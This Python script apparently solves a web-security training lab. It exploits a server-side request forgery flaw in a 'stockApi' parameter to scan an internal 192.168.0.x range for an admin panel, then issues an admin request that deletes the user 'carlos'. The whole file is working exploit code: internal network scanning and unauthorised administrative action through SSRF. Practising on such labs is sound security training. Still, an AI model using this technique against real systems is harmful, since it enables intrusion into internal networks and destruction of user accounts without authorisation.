import sys
import os
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "../.."))
from utils.base import LabSession

lab = LabSession()

# scan the internal network through the stockApi SSRF to find the admin panel
# backend systems sit on private IPs that are unreachable from outside
lab.info("Scanning 192.168.0.0/24 for admin panel...")

target_ip = None
for i in range(1, 256):
    ip = f"192.168.0.{i}"
    resp = lab.post("/product/stock", data={
        "stockApi": f"http://{ip}:8080/admin"
    })
    if resp.status_code == 200 and "carlos" in resp.text:
        target_ip = ip
        lab.success(f"Admin panel found at {ip}")
        break
    if i % 50 == 0:
        lab.info(f"Scanned {i}/255...")

if not target_ip:
    lab.fail("Could not find admin panel on the internal network")

lab.info("Deleting carlos...")
lab.post("/product/stock", data={
    "stockApi": f"http://{target_ip}:8080/admin/delete?username=carlos"
})

lab.check_solved()
